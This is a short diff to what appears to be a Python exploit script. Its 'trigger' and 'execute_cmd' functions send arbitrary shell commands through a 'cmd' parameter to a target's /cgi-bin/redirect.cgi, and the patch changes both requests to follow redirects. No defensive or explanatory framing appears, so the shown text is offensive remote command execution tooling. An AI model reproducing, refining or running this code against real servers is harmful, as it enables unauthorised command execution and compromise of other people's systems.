@@ -28,7 +28,7 @@ def trigger(target_url):
     print(f"\n[*] GET {url}")
 
     try:
-        resp = requests.get(url, timeout=10, allow_redirects=False)
+        resp = requests.get(url, timeout=10, allow_redirects=True)
     except requests.RequestException as e:
         print(f"[-] Connection failed: {e}")
         return False
@@ -63,7 +63,7 @@ def execute_cmd(target_url, cmd):
 
     url = f"{target_url.rstrip('/')}/cgi-bin/redirect.cgi?cmd={quote(cmd)}"
     try:
-        resp = requests.get(url, timeout=10, allow_redirects=False)
+        resp = requests.get(url, timeout=10, allow_redirects=True)
     except requests.RequestException as e:
         print(f"[-] Connection failed: {e}")
         return None
